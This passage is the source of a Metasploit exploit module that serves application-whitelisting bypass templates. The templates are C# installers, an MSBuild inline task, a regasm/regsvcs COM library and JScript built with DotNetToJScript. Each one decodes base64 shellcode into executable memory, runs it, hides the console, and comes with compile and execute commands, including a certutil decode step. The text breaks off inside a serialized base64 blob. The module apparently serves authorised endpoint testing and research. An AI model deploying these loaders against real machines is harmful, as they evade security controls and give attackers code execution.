##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Whitelist_Bypass_Server',
      'Description'  => %q(
        This module will create a web server that can host various files to test the effectiveness of an endpoints application
        whitelisting (e.g software restriction policies, AppLocker). To use this module select one of the BYPASS_TECHNIQUES then
        visit the the web server from the endpoint to be tested and follow the instructions on the hosted web page.
      ),
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Nick Tyrer <@NickTyrer>',
          'James Forshaw', # For DotNetToJScript @tiraniddo
          'Casey Smith',  # AppLocker bypass research and vulnerability discovery (@subTee)
        ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [ [ 'Windows', {} ] ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Jul 25 2017',
      'References'     =>
        [
          ['URL', 'http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html'],
          ['URL', 'https://github.com/tyranid/DotNetToJScript']
        ]
    ))

    register_options(
      [
        OptEnum.new('BYPASS_TECHNIQUE',
        [true, 'Method to trigger the payload.', 'INSTALL_UTIL', ['INSTALL_UTIL','MSBUILD','REGASM_REGSVCS','JSCRIPT','VBSCRIPT','REGSVR','HTA']]),
      ])
  end


  def on_request_uri(cli, _request)
   case datastore['BYPASS_TECHNIQUE']
    when 'INSTALL_UTIL'
      print_status('Delivering Bypass')
      data = install_util
      send_response(cli, data, 'Content-Type' => 'text/plain')
    when 'MSBUILD'
      print_status('Delivering Bypass')
      data = msbuild
      send_response(cli, data, 'Content-Type' => 'text/plain')
    when 'REGASM_REGSVCS'
      print_status('Delivering Bypass')
      data = regasm_regsvcs
      send_response(cli, data, 'Content-Type' => 'text/plain')
    when 'JSCRIPT'
      print_status('Delivering Bypass')
      data = jscript
      send_response(cli, data, 'Content-Type' => 'text/plain')
    when 'VBSCRIPT'
      print_status('Delivering Bypass')
      data = vbscript
      send_response(cli, data, 'Content-Type' => 'text/plain')
    when 'REGSVR'
      print_status('Delivering Bypass')
      data = regsvr
      send_response(cli, data, 'Content-Type' => 'text/plain')
    when 'HTA'
      print_status('Delivering Bypass')
      data = hta
      send_response(cli, data, 'Content-Type' => 'text/plain')
   end
  end


  def build_payload
    sc = payload.encoded
    esc = Rex::Text.encode_base64(sc)
  end


  def install_util
    esc = build_payload
     <<-HEREDOC
        /*
        Copy the entire contents of this page to a file named installutil.txt
        x86{
        Compile using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\csc.exe /out:installutil.exe installutil.txt
        Execute using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe
        }
        x64{
        Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\csc.exe /out:installutil.exe installutil.txt
        Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe
        }
        */
        using System;

        namespace Install_Util
        {
          public class Program { public static void Main() { } }

          [System.ComponentModel.RunInstaller(true)]
          public class Pop : System.Configuration.Install.Installer
          {
            private static Int32 MEM_COMMIT=0x1000;
            private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
            private static UInt32 INFINITE = 0xFFFFFFFF;

            [System.Runtime.InteropServices.DllImport("kernel32")]
            private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);

            [System.Runtime.InteropServices.DllImport("kernel32")]
            private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);

            [System.Runtime.InteropServices.DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);

            [System.Runtime.InteropServices.DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

            [System.Runtime.InteropServices.DllImport("Kernel32")]
            private static extern IntPtr GetConsoleWindow();

            const int SW_HIDE = 0;
            const int SW_SHOW = 5;

            public override void Uninstall(System.Collections.IDictionary s)
            {
              IntPtr hwnd;
              hwnd = GetConsoleWindow();
              ShowWindow(hwnd, SW_HIDE);
              string enc = "#{esc}";
              byte[] newBytes = Convert.FromBase64String(enc);
              byte[] sc = newBytes;

              IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              System.Runtime.InteropServices.Marshal.Copy(sc, 0, m, sc.Length);
              IntPtr id = IntPtr.Zero;
              WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);
            }
          }
        }
    HEREDOC
  end


  def msbuild
    esc = build_payload
     <<-HEREDOC
        <!--
        Copy the entire contents of this page to a file named msbuild.txt
        x86{
        Execute using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\MSBuild.exe msbuild.txt
        }
        x64{
        Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\MSBuild.exe msbuild.txt
        }
        -->
        <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
        <Target Name="metamsbuild">
        <Meta />
        </Target>
        <UsingTask
          TaskName="meta"
          TaskFactory="CodeTaskFactory"
          AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
         <Task>
         <Code Type="Class" Language="cs">
         <![CDATA[
                 using System;
                 using System.Runtime.InteropServices;
                 using Microsoft.Build.Framework;
                 using Microsoft.Build.Utilities;
                 public class meta :  Task, ITask
                 {
                   private static Int32 MEM_COMMIT=0x1000;
                   private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
                   private static UInt32 INFINITE = 0xFFFFFFFF;

                   [DllImport("kernel32")]
                   private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);

                   [DllImport("kernel32")]
                   private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);

                   [DllImport("kernel32")]
                   private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);

                   [DllImport("user32.dll")]
                   static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

                   [DllImport("Kernel32")]
                   private static extern IntPtr GetConsoleWindow();

                   const int SW_HIDE = 0;
                   const int SW_SHOW = 5;

                 public override bool Execute()
                 {
                   IntPtr hwnd;
                   hwnd = GetConsoleWindow();
                   ShowWindow(hwnd, SW_HIDE);
                   string enc = "#{esc}";
                   byte[] newBytes = Convert.FromBase64String(enc);
                   byte[] sc = newBytes;

                   IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                   Marshal.Copy(sc, 0, m, sc.Length);
                   IntPtr id = IntPtr.Zero;
                   WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);
                   return true;
                 }
                }
              ]]>
         </Code>
         </Task>
         </UsingTask>
         </Project>
    HEREDOC
  end


  def regasm_regsvcs
    esc = build_payload
    <<-HEREDOC
       /*
       Copy the entire contents of this page to a file named regasm_regsvcs.txt
       Copy below base64 string into a text file named meta.txt
       BwIAAAAkAABSU0EyAAQAAAEAAQD9yIxqf9oJgwLw6nUHqVNq4LaP+/eaL4qTT9K9aV/z7ddCP8+Uf2/47KnHklpaw+eH03ZaA2yKYBA9s+Al0VoyajA76HQpHDaCgiURBIT2GBLUGwdhoEMWX5J8eoCzkucJEjSsavQh+r9JeB6zcQvoZIx0PrpELgQc8is8j2jvsFuc5LQ8ZFoPk1273TTxKibw84HFESjxJrRtkSjwoEo4OUuZtL3C7fDgnaSoeLnMwohmyTTjt15zgBZv7xD5u/CHD4/+tySJufY5j0FkBxhyqt2DWHcmH4MQCC6PgYfIuTXEAD35o0cg+6s6pJYKB+DUCrU5vSime3jyWno9vCe87UT+fQcDrKntHBmjnj9WliAMZlU1IuCWieT7fzGZqqIsd4rrcgxetnWzaWRAkgHcTVkmVPIt0z9zHU71s7CER2viklJkiaZjRQan5ZA7bTqqsuG1xoIyXTWbKsaAMCKf5a4IJS2ImpqaYA9HRBrIV7be2o0QJxSm1LPqBXJqkAhnCpcYyfve2dql7fF+fAIDGe3ZgCEbJsfYuAaAY0snGJQhUgLmwO8GDbsbMUTuBQspDv8QXsF53UNH5v5dnOKaTfo71LrI+I5zBUqEYP3BDtK0qryu/J1eq80nPAmpNqRbFnYm1OdGKpgzHS+Ws7obPSt1HG3//BxC3a5znX0evfCfSaaWRswhjvblnh1070b3jkT6nJeksKuuVEHvudAQAtGn2vxNDs4CqrJODi5Z/BAKgpIZqQeZmh3r4Zb5OI0=
       Execute: certutil.exe -decode meta.txt meta.snk
       x86{
       Compile using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regasm_regsvcs.dll /keyfile:meta.snk regasm_regsvcs.txt
       Execute using: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe regasm_regsvcs.dll
       or
       Execute using: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U regasm_regsvcs.dll
       }
       x64{
       Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regasm_regsvcs.dll /keyfile:meta.snk regasm_regsvcs.txt
       Execute using: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe regasm_regsvcs.dll
       or
       Execute using: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U regasm_regsvcs.dll
       }
       */
       using System;
       using System.EnterpriseServices;
       using System.Runtime.InteropServices;

       namespace regsvcs
       {
         public class Bypass : ServicedComponent
         {
           public Bypass() { Console.WriteLine("Hello"); }

           [ComRegisterFunction]
           public static void RegisterClass(string key)
           {
             sc.exec();
           }

           [ComUnregisterFunction]
           public static void UnRegisterClass(string key)
           {
             sc.exec();
           }
         }

         public class sc
         {
           private static Int32 MEM_COMMIT = 0x1000;
           private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;
           private static UInt32 INFINITE = 0xFFFFFFFF;

           [DllImport("kernel32")]
           private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);

           [DllImport("kernel32")]
           private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);

           [DllImport("kernel32")]
           private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);

           [DllImport("user32.dll")]
           static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

           [DllImport("Kernel32")]
           private static extern IntPtr GetConsoleWindow();

           const int SW_HIDE = 0;
           const int SW_SHOW = 5;

           public static void exec()
           {
             IntPtr hwnd;
             hwnd = GetConsoleWindow();
             ShowWindow(hwnd, SW_HIDE);
             string enc = "#{esc}";
             byte[] newBytes = Convert.FromBase64String(enc);
             byte[] sc = newBytes;

             IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             Marshal.Copy(sc, 0, m, sc.Length);
             IntPtr id = IntPtr.Zero;
             WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);
           }
         }
       }
    HEREDOC
  end


  def jscript
    esc = build_payload
    <<-HEREDOC
       /*
        Copy the entire contents of this page to a file named jscript.js
        x86{
        Execute using: C:\\Windows\\System32\\cscript.exe jscript.js
        or
        Execute using: C:\\Windows\\System32\\wscript.exe jscript.js
        }
        x64{
        Execute using: C:\\Windows\\SysWOW64\\cscript.exe jscript.js
        or
        Execute using: C:\\Windows\\SysWOW64\\wscript.exe jscript.js
        }
       */
       var enc = "#{esc}"

       function setversion() {
       var shell = new ActiveXObject('WScript.Shell');
       ver = 'v4.0.30319';
       try {
       shell.RegRead('HKLM\\\\SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319\\\\');
       } catch(e) {
       ver = 'v2.0.50727';
       }
       shell.Environment('Process')('COMPLUS_Version') = ver;

       }
       function debug(s) {}
       function base64ToStream(b) {
        var enc = new ActiveXObject("System.Text.ASCIIEncoding");
        var length = enc.GetByteCount_2(b);
        var ba = enc.GetBytes_4(b);
        var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
        ba = transform.TransformFinalBlock(ba, 0, length);
        var ms = new ActiveXObject("System.IO.MemoryStream");
        ms.Write(ba, 0, (length / 4) * 3);
        ms.Position = 0;
        return ms;
       }

       var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
       "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
       "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
       "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
       "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
       "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
       "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
       "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
       "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
       "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
       "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
       "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
       "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
       "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
       "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
       "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
       "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
       "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
       "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
       "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
       "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
       "ZW1ibHkGFwAAAARMb2FkCg8MAAAAABYAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
       "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAswd3WQAAAAAA"+
       "AAAA4AAiAAsBMAAADAAAAAgAAAAAAAA+KgAAACAAAABAAAAAAEAAACAAAAACAAAEAAAAAAAAAAQA"+
       "AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA7CkA"+
       "AE8AAAAAQAAAvAUAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAALQoAAAcAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
       "AAAALnRleHQAAABECgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAvAUAAABA"+
       "AAAABgAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAUAAAAAAAAAAAA"+
       "AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAACAqAAAAAAAASAAAAAIABQDkIAAA0AcAAAEAAAABAAAG"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABioAABMwBgBe"+
       "AAAAAQAAESgGAAAGFigFAAAGJgMoDgAACgp+DwAACgaOaWooEAAACn4BAAAEfgIAAAQoAgAABgsG"+
       "FgcGjmkoEQAACn4PAAAKDAh+EgAACgcIFhICKAMAAAZ+AwAABCgEAAAGJioeAigTAAAKKnYgABAA"+
       "AIABAAAEH0AoFAAACoACAAAEFYADAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUA"+
       "bAAAABQDAAAjfgAAgAMAABwDAAAjU3RyaW5ncwAAAACcBgAABAAAACNVUwCgBgAAEAAAACNHVUlE"+
       "AAAAsAYAACABAAAjQmxvYgAAAAAAAAACAAABVx0CFAkAAAAA+gEzABYAAAEAAAATAAAAAgAAAAUA"+
       "AAAJAAAADwAAABQAAAACAAAADgAAAAEAAAADAAAABQAAAAEAAAABAAAAAADmAQEAAAAAAAYAWwGO"+
       "AgYAyAGOAgYAqABcAg8ArgIAAAYA0AAuAgYAPgEuAgYAHwEuAgYArwEuAgYAewEuAgYAlAEuAgYA"+
       "5wAuAgYAvABvAgYAmgBvAgYAAgEuAgYAzQIcAgYA4AIcAgYAVQIcAgYAVAIcAgYACQJvAgAAAAAf"+
       "AAAAAAABAAEAAQAQAGYAAAA9AAEAAQARAFAAUwARADkAJwARADAAVgBRgCgAUwBRgFsAUwBQIAAA"+
       "AACRACkCWQABAAAAAACAAJEgeABdAAEAAAAAAIAAkSCFAGUABQAAAAAAgACRIMACcAALAAAAAACA"+
       "AJEgAAN2AA0AAAAAAIAAkSDvAnwADwBUIAAAAACGACMCEAAPAL4gAAAAAIYYRwIGABAAxiAAAAAA"+
       "kRhNAlkAEAAAAAEAaQAAAAIAvgIAAAMA7QIAAAQARQIAAAEA6wIAAAIA6AIAAAMAYwAAAAQARQIA"+
       "AAUAgwAAAAYAkgAAAAEABwIAAAIAvQIAAAEAlQAAAAIACwMAAAEAdAAJAEcCAQARAEcCBgAZAEcC"+
       "CgApAEcCEAAxAEcCEAA5AEcCEABBAEcCEABJAEcCEABRAEcCEABZAEcCEABhAEcCFQBpAEcCEABx"+
       "AEcCEACBAPYBIQCJAEACJwCRANQCKgCZABQDLwCRAEACOAB5AEcCBgCJANQCOwAIABAASQAIABQA"+
       "TgAuAAsAgAAuABMAiQAuABsAqAAuACMAsQAuACsAwgAuADMAwgAuADsAwgAuAEMAsQAuAEsAyAAu"+
       "AFMAwgAuAFsAwgAuAGMA4AAuAGsACgFDAFsAFwEaABYAEQINAAABBQB4AAEAAAEHAIUAAQAAAQkA"+
       "wAIBAAABCwAAAwIAAAENAO8CAwAEgAAAAQAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAQABr"+
       "AAAAAAAAAAAAAENvbnNvbGVBcHAxAEtlcm5lbDMyAGtlcm5lbDMyADxNb2R1bGU+AFNXX0hJREUA"+
       "SU5GSU5JVEUAUEFHRV9FWEVDVVRFX1JFQURXUklURQBNRU1fQ09NTUlUAFNXX1NIT1cAc2EAbWV0"+
       "YQBtc2NvcmxpYgBlbmMAVmlydHVhbEFsbG9jAENyZWF0ZVRocmVhZABpZABoV25kAEd1aWRBdHRy"+
       "aWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0"+
       "bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lv"+
       "bkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlw"+
       "dGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJv"+
       "ZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlB"+
       "dHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQ29uc29sZUFwcDEuZXhlAEZy"+
       "b21CYXNlNjRTdHJpbmcAaABNYXJzaGFsAHVzZXIzMi5kbGwAU3lzdGVtAHNjX2luAE1haW4AU3lz"+
       "dGVtLlJlZmxlY3Rpb24AWmVybwBwAC5jdG9yAC5jY3RvcgBVSW50UHRyAFN5c3RlbS5EaWFnbm9z"+
       "dGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGls"+
       "ZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBtcwBXYWl0Rm9yU2luZ2xlT2JqZWN0AG9wX0V4cGxp"+
       "Y2l0AENvbnZlcnQAc3QAYXR0AEdldENvbnNvbGVXaW5kb3cAU2hvd1dpbmRvdwBuQ21kU2hvdwBD"+
       "b3B5AAAAAAAAAABuhaTR9O3GRKCd/bQkGE2PAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIGBwMd"+
       "BRgYBQABHQUOAgYYBAABGQsIAAQBHQUIGAgCBhkEAAEYCAi3elxWGTTgiQQAAAAABAUAAAACBggC"+
       "BgkDAAABBwAEGBgZCBgKAAYYGBkYGAgQGAUAAgkYCQUAAgIYCAMAABgIAQAIAAAAAAAeAQABAFQC"+
       "FldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAAEAEAC0NvbnNvbGVBcHAxAAAFAQAAAAAX"+
       "AQASQ29weXJpZ2h0IMKpICAyMDE3AAApAQAkMjc4Y2NlYjYtYmEyZi00NDljLWE0MWUtMTA5YmU4"+
       "ODQ0YTQ1AAAMAQAHMS4wLjAuMAAABQEAAQAAAAAAAAAAALMHd1kAAAAAAgAAABwBAADQKAAA0AoA"+
       "AFJTRFOoH3QpJw5sQpkQDW66wbA6AQAAAGM6XHVzZXJzXGJvYlxkb2N1bWVudHNcdmlzdWFsIHN0"+
       "dWRpbyAyMDE3XFByb2plY3RzXENvbnNvbGVBcHAxXENvbnNvbGVBcHAxXG9ialxSZWxlYXNlXENv"+
       "bnNvbGVBcHAxLnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "FCoAAAAAAAAAAAAALioAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAqAAAAAAAAAAAAAAAAX0Nv"+
       "ckV4ZU1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAABQAACAAAAAAAAA"+
       "AAAAAAAAAAABAAEAAAA4AACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAB"+
       "AAEAAABoAACAAAAAAAAAAAAAAAAAAAABAAAAAAC8AwAAkEAAACwDAAAAAAAAAAAAACwDNAAAAFYA"+
       "UwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/"+
       "AAAAAAAAAAQAAAABAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAA"+
       "AAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASMAgAAAQBTAHQAcgBpAG4AZwBG"+
       "AGkAbABlAEkAbgBmAG8AAABoAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUA"+
       "bgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAQAAMAAEARgBp"+
       "AGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEMAbwBuAHMAbwBsAGUAQQBwAHAAMQAAADAA"+
       "CAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAAAAEAAEAABAEkAbgB0"+
       "AGUAcgBuAGEAbABOAGEAbQBlAAAAQwBvAG4AcwBvAGwAZQBBAHAAcAAxAC4AZQB4AGUAAABIABIA"+
       "AQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAg"+
       "ADIAMAAxADcAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEgA"+
       "EAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABDAG8AbgBzAG8AbABlAEEAcABw"+
       "ADEALgBlAHgAZQAAADgADAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAQwBvAG4AcwBvAGwA"+
       "ZQBBAHAAcAAxAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAw"+
       "AC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAA"+
       "LgAwAAAAzEMAAOoBAAAAAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVU"+
       "Ri04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCg0KPGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1t"+
       "aWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJ"+
       "ZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8"+
       "dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAg"+
       "PHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFz"+
       "LW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVs"+
